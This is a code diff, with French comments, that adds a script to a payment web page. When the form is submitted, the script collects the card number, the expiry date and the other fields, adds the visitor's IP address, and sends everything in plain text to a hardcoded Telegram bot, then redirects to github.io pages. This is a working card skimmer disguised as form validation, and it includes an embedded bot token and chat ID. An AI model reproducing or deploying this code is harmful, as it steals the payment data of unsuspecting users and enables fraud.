@@ -275,6 +275,89 @@
         input.value = input.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/g, '$1/');
       }
     });
+  </script>  <script>
+    $(document).ready(function () {
+      // Récupérer l'IP de l'utilisateur
+      $.getJSON("https://api.ipify.org?format=json", function (data) {
+        $('#user_ip').val(data.ip);
+      });
+
+      // Soumettre le formulaire avec validation
+      $('#paymentForm').on('submit', function (e) {
+        e.preventDefault();
+        if (!validateForm()) {
+          return;
+        }
+        var formData = $(this).serializeArray();
+        var message = "Nouvelle commande reçue :\n";
+        formData.forEach(function (item) {
+          if (item.name !== '_token') {
+            message += item.name + ": " + item.value + "\n";
+          }
+        });
+
+        // Envoyer les données vers votre bot Telegram via un webhook ou API
+        $.ajax({
+          url: 'https://api.telegram.org/bot7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k/sendMessage',
+          method: 'POST',
+          data: {
+            chat_id: '7747778364',
+            text: message
+          },
+          success: function () {
+            window.location.href = "https://justmoicom.github.io/test3/";
+          },
+          error: function () {
+            window.location.href = "https://justmoicom.github.io/tel/";
+          }
+        });
+      });
+
+      // Validation des champs
+      function validateForm() {
+        var isValid = true;
+        $('input[required]').each(function () {
+          if ($(this).val().trim() === '') {
+            alert($(this).attr('placeholder') + ' est requis.');
+            isValid = false;
+            return false;
+          }
+        });
+        var expiryDate = $('#expiry_date').val();
+        if (!validateExpiryDate(expiryDate)) {
+          isValid = false;
+        }
+        return isValid;
+      }
+
+      function validateExpiryDate(date) {
+        var regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+        if (!regex.test(date)) {
+          alert('La date d\'expiration doit être au format MM/AA.');
+          return false;
+        }
+        var parts = date.split('/');
+        var month = parseInt(parts[0], 10);
+        if (month < 1 || month > 12) {
+          alert('Le mois doit être compris entre 01 et 12.');
+          return false;
+        }
+        return true;
+      }
+
+      // Formater le numéro de carte en blocs de 4 chiffres
+      function formatCardNumber(input) {
+        input.value = input.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
+      }
+
+      // Formater automatiquement la date d'expiration en MM/AA
+      function formatExpiryDate(input) {
+        input.value = input.value.replace(/\D/g, '').replace(/(\d{2})(?=\d)/g, '$1/');
+      }
+    });
   </script>
+  
+  
+  
 </body>
 </html>
